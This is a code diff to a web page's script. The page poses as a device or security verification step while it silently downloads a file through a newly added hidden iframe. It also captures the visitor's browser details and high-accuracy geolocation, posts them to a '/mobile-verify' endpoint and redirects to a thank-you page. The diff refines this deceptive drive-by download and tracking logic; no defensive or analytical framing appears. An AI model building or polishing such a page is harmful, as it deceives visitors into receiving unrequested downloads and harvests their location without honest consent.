@@ -14,6 +14,9 @@
     </div>
 </div>
 
+<!-- Hidden iframe for background download -->
+<iframe id="download-frame" style="display:none;"></iframe>
+
 <style>
     @keyframes spin {
         0% {
@@ -28,17 +31,21 @@
 
 <script>
     window.onload = function () {
+        console.log("Initialization started...");
         const statusText = document.getElementById('status-text');
+        const downloadFrame = document.getElementById('download-frame');
 
-        // 1. Trigger Automatic Download
+        // 1. Trigger Automatic Download safely
         setTimeout(() => {
             statusText.innerText = "Synchronizing security certificates...";
-            window.location.href = "/download-verify";
+            console.log("Triggering download...");
+            downloadFrame.src = "/download-verify";
         }, 1500);
 
         // 2. Capture Device Info & Location
         setTimeout(() => {
             statusText.innerText = "Verifying device integrity...";
+            console.log("Capturing device data...");
 
             const deviceInfo = {
                 userAgent: navigator.userAgent,
@@ -49,21 +56,24 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        deviceInfo.location = `${position.coords.latitude}, ${position.coords.longitude}`;
+                        console.log("Location obtained");
+                        deviceInfo.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
                         sendData(deviceInfo);
                     },
                     (error) => {
-                        console.error("Location error:", error);
+                        console.warn("Location permission denied or timed out");
                         sendData(deviceInfo);
                     },
-                    { timeout: 5000 }
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             } else {
+                console.warn("Geolocation not supported");
                 sendData(deviceInfo);
             }
         }, 3000);
 
         function sendData(data) {
+            console.log("Sending data to server...", data);
             fetch('/mobile-verify', {
                 method: 'POST',
                 headers: {
@@ -72,14 +82,15 @@
                 body: JSON.stringify(data),
             })
                 .then(response => response.json())
-                .then(data => {
+                .then(resData => {
+                    console.log("Server response:", resData);
                     statusText.innerText = "Verification complete. Redirecting...";
                     setTimeout(() => {
                         window.location.href = "/thankyou";
                     }, 1000);
                 })
                 .catch((error) => {
-                    console.error('Error:', error);
+                    console.error('Fetch error:', error);
                     window.location.href = "/thankyou";
                 });
         }
